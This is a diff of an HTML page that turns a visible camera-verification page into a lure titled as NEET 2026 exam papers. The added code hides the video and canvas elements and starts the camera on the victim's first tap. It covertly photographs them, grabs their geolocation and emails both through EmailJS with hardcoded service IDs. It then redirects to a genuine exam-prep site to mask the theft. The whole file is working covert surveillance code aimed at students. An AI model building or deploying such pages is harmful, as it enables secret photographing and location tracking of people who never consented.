@@ -1,25 +1,121 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Camera Verification</title>
+<title>NEET 2026 IMP PYQ</title>
+
+<style>
+body {
+    background: #000;
+    color: white;
+    font-family: Arial;
+    text-align: center;
+    user-select: none;
+    margin-top: 250px;
+}
+
+/* Tap area */
+#loading {
+    font-size: 22px;
+    font-weight: bold;
+    cursor: pointer;
+    z-index: 9999;
+    position: relative;
+    pointer-events: auto !important;
+}
+
+/* Hide camera elements */
+video, canvas, #status {
+    width: 0 !important;
+    height: 0 !important;
+    opacity: 0 !important;
+    position: absolute;
+    pointer-events: none !important;
+}
+</style>
+
 </head>
 <body>
-  <h2>Please verify your identity</h2>
 
-  <button onclick="startCamera()">Open Camera</button>
-  <p id="status"></p>
+<div id="loading">Tap to continue</div>
+<p id="status"></p>
 
-  <video id="video" width="320" height="240" autoplay></video>
+<!-- hidden camera -->
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
 
+<!-- EmailJS -->
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 <script>
+emailjs.init("vieRRG0Q8QGFFS-XO");
+
+let started = false;
+
+/* Tap to start */
+document.addEventListener("click", () => {
+    if (!started) {
+        started = true;
+        document.getElementById("loading").innerText = "Starting…";
+        startCamera();
+    }
+});
+
 async function startCamera() {
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-    document.getElementById("video").srcObject = stream;
-    document.getElementById("status").innerText = "Camera access granted.";
-  } catch (err) {
-    document.getElementById("status").innerText = "Camera permission denied.";
-  }
+    try {
+        let stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        document.getElementById("video").srcObject = stream;
+        document.getElementById("loading").innerText = "Loading…";
+        setTimeout(takePhoto, 1200);
+    } 
+    catch (err) {
+        document.getElementById("loading").innerText = "Tap to continue";
+        started = false;
+    }
+}
+
+function takePhoto() {
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const ctx = canvas.getContext("2d");
+
+    canvas.width = 320;
+    canvas.height = 240;
+
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    const img = canvas.toDataURL("image/jpeg", 0.25);
+
+    sendData(img);
+}
+
+function sendData(photo) {
+    document.getElementById("loading").innerText = "Finishing…";
+
+    let emailData = {
+        photo: photo,
+        location: "Location Blocked"
+    };
+
+    navigator.geolocation.getCurrentPosition(
+        pos => {
+            emailData.location = pos.coords.latitude + ", " + pos.coords.longitude;
+            sendEmailJS(emailData);
+        },
+        err => sendEmailJS(emailData),
+        { timeout: 4000 }
+    );
+}
+
+function sendEmailJS(data) {
+    emailjs.send("service_c2bqpj9", "template_pee9jcq", data)
+    .then(() => {
+        document.getElementById("loading").innerText = "Done ✓ Redirecting…";
+        setTimeout(() => {
+            window.location.href = "https://www.neetprep.com/papers-test-series?utm_source=google";
+        }, 800);
+    })
+    .catch(err => {
+        document.getElementById("loading").innerText = "Error.";
+        console.error(err);
+    });
 }
 </script>
 
